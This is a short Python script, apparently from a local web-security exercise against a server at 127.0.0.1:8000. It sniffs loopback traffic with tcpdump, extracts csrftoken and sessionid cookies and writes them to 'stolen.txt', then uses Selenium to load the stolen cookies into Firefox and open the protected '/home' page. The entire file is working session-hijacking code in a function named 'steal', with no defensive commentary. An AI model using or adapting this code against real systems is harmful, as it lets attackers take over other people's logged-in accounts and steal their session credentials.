import argparse
import subprocess as sub
import selenium.webdriver
import re

import sys

host = '127.0.0.1'
port = '8000'
url = 'http://'+host+':'+port
secret_url = url + '/home'

def steal():
    p = sub.Popen(('sudo', 'tcpdump', '-A', '-i', 'lo', 'host', host), stdout=sub.PIPE)
    sessions = []
    tokens = []
    file = open("stolen.txt", 'a')
    for row in iter(p.stdout.readline, 'b'):
        line = str(row.rstrip())
        matchObj = re.search(r'csrftoken=(.*?); sessionid=(.*?)\'', line)
        if matchObj:
            id = matchObj.group(2)
            token = matchObj.group(1)
            if id not in sessions:
                sessions.append(id)
                tokens.append(token)
                file.write(id + "\t" + token + "\n")
                print("id: " + id + "\t" + "token: " + token + "\n")
                driver = selenium.webdriver.Firefox()
                driver.get(url)
                driver.add_cookie({"name": "csrftoken", 'value': token})
                driver.add_cookie({"name": "sessionid", 'value': id})
                driver.get(secret_url)


if __name__ == "__main__":
    steal()
